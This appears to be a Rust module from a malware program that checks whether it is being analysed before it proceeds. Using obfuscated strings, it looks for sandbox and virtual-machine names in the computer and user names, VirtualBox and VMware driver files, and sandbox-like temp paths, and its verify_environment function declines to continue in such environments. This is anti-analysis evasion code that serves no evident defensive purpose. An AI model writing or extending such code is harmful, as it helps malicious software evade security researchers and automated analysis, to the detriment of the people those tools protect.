use crate::encrypted::*;

#[allow(dead_code)]
fn check_cpuid_hypervisor() -> bool {
    unsafe { core::arch::x86_64::__cpuid(1).ecx & (1 << 31) != 0 }
}

fn check_names() -> bool {
    if let Ok(name) = std::env::var(s_det_computername()) {
        let lower = name.to_lowercase();
        let targets = [
            s_det_sandbox(),
            s_det_cuckoo(),
            s_det_vbox(),
            s_det_vmware(),
            s_det_xen(),
            s_det_qemu(),
        ];
        if targets.iter().any(|b| lower.contains(b.as_str())) {
            return true;
        }
    }
    if let Ok(user) = std::env::var(s_det_username()) {
        let lower = user.to_lowercase();
        if lower == s_det_sandbox() || lower == s_det_virus() || lower == s_det_malware() || lower == s_det_currentuser() {
            return true;
        }
    }
    false
}

fn check_files() -> bool {
    let sys = std::env::var(s_det_windir()).unwrap_or_else(|_| s_det_windir_default());
    let drivers = std::path::PathBuf::from(&sys).join(s_det_system32_drivers());
    let checks = [
        s_det_vboxguest_sys(),
        s_det_vmhgfs_sys(),
        s_det_vboxsf_sys(),
        s_det_vboxvideo_sys(),
        s_det_vboxmouse_sys(),
        s_det_vboxguest_sys2(),
        s_det_vmci_sys(),
        s_det_vm3dmp_sys(),
    ];
    for name in &checks {
        if drivers.join(name).exists() { return true; }
    }
    false
}

fn check_temp_path() -> bool {
    if let Ok(temp) = std::env::var(s_det_temp_env()) {
        let lower = temp.to_lowercase();
        if lower.contains(&s_det_temp_sandbox().to_lowercase())
            || lower.contains(&s_det_temp_virus().to_lowercase())
            || lower.contains(&s_det_temp_sample().to_lowercase())
        {
            return true;
        }
    }
    false
}

/// Quick pre-flight check: returns false if clearly in a sandbox/VM.
/// This runs before the heavy composite check in sandbox.rs.
pub fn verify_environment() -> bool {
    if check_names()     { return false; }
    if check_files()     { return false; }
    if check_temp_path() { return false; }
    true
}
